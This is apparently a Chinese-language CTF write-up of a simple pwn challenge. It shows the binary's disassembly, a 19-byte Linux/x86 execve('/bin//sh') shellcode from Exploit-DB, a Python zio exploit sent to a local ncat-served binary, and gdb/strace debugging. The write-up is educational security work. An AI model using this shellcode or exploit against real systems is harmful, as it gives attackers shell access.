---
category: CTF
title: Pwn Challenge 0
---

## Pwn Challenge 0

> 遇到一个简单的Pwn，记录一下，有一些有意思的问题也放在这里。

### Pwn汇编代码

这个程序很简单，Binary在[这里]({{ site.url }}/resources/Binary/2017-05-06-pwn_1)，直接把它的反汇编贴在下面：

```
.text:0804847D                 push    ebp
.text:0804847E                 mov     ebp, esp
.text:08048480                 and     esp, 0FFFFFFF0h
.text:08048483                 sub     esp, 30h
.text:08048486                 mov     dword ptr [esp+8], 14h
.text:0804848E                 lea     eax, [esp+13h]
.text:08048492                 mov     [esp+4], eax    ; buf
.text:08048496                 mov     dword ptr [esp], 0 ; fd
.text:0804849D                 call    _read
.text:080484A2                 mov     byte ptr [esp+26h], 0
.text:080484A7                 lea     eax, [esp+13h]
.text:080484AB                 mov     [esp], eax      ; s
.text:080484AE                 call    _strlen
.text:080484B3                 mov     [esp+4], eax
.text:080484B7                 mov     dword ptr [esp], offset format ; "%d welcome\n"
.text:080484BE                 call    _printf
.text:080484C3                 lea     eax, [esp+13h]
.text:080484C7                 mov     [esp+2Ch], eax
.text:080484CB                 mov     eax, [esp+2Ch]
.text:080484CF                 call    eax
.text:080484D1                 leave
.text:080484D2                 retn
.text:080484D2 main            endp
```

### 分析

这个题的设定很刻意，现实中恐怕见不到这么明显的漏洞了。大概说一下，就是我们输入的内容会被当做指令执行，然而我们最多只能输入19个字节。输入的东西就直接是shellcode，也不用劫持控制流了（也劫持不了，19个字节不够覆盖到返回地址）。现在就考虑找一段shellcode。

[Exploit-db](https://www.exploit-db.com/shellcode/)在这时就显得非常有用了。可以直接找指定长度的shellcode。我找了一个19字节的：

```
;================================================================================
; The MIT License
;
; Copyright (c) <year> <copyright holders>
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
; 
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
; 
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
; THE SOFTWARE.
;================================================================================
;     Name : Linux/x86 - execve(/bin/sh") shellcode (19 bytes)
;     Author : WangYihang
;     Email : wangyihanger@gmail.com
;     Tested on: Linux_x86
;     Shellcode Length: 19
;================================================================================
; Shellcode : 
char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
;================================================================================
; Python : 
        shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
;================================================================================
; Assembly language code : 
global _start
        _start:
                push 0bH
                pop eax
                cdq
                push edx
                push "//sh"
                push "/bin"
                mov ebx, esp
                int 80H
;================================================================================
```

然后用zio写一个Exp：

{% highlight python %}
from zio import *

IP = "127.0.0.1"
port = 10000

shellcode = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\n'
conn = zio((IP, port))
#conn = zio("./pwn_1")
conn.write(shellcode)
conn.interact()
{% endhighlight %}

用ncat把漏洞程序挂上：

```
ncat -l 10000 -e ./pwn_1
```

### 问题

**一 | IDA Pro反编译出错**

IDA Pro在遇到这种`call eax`指令时会出错。报

```
Decompilation failure:
80484CF: call analysis failed
```

想想也能想得通，相当于指令是运行时才确定的，它当然不能被静态分析了。

**二 | 打开的shell直接退出**

这个问题发生在手动输入shellcode的时候。如下：

```
python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')" | ./pwn_1
```

这样直接就退出了。为了查看细节，我先

```
python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')" > shellcode
```

然后在gdb中

```
r < shellcode
```

单步执行到`int 0x80`后，发现gdb提示

```
process 26793 is executing new program: /bin/dash
```

说明shell成功打开了呀。

我们再用strace追一下：

```
strace ./pwn_1 < shellcode
```

我们看到

```
execve("/bin//sh", [0], [/* 0 vars */]) = 0
```

然而，execve正常执行成功时是不会返回的。这里为什么返回了呢？上面用zio写的脚本在interact()后成功连接上了打开的shell，没有直接退出呀。

在[网上的一篇文章](http://www.purpleroc.com/md/2016-02-25@Thinking-About-Level2.html)的提示下，我gdb不设断点，直接`r < shellcode`可以看到出错提示：

```
[New process 28700]
/bin/dash: not found
[Inferior 2 (process 28700) exited with code 0177]
```

这个出错码0177和上面提到的文章里是一样的。情况很类似，不同的是我是通过`int 0x80`来调用execve，他是通过`system()`来调用。

来看一下在即将执行`int 0x80`时寄存器和栈的情况：

```
EAX: 0xb ('\x0b')
EBX: 0xbffff660 ("/bin//sh")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff6a8 --> 0x0 
ESP: 0xbffff660 ("/bin//sh")

gdb-peda$ x/10x $esp
0xbffff660:     0x6e69622f      0x68732f2f      0x00000000      
```

感觉没问题呀，shellcode也是有效的。这是为什么呢？留坑吧。

### 附录

**验证shellcode是否有效**

将从Exploit-db上拿到的shellcode汇编代码保存为`shell.asm`，

```
nasm -f elf shell.asm
ld -o shell shell.o
```

执行一下，看看能否打开shell。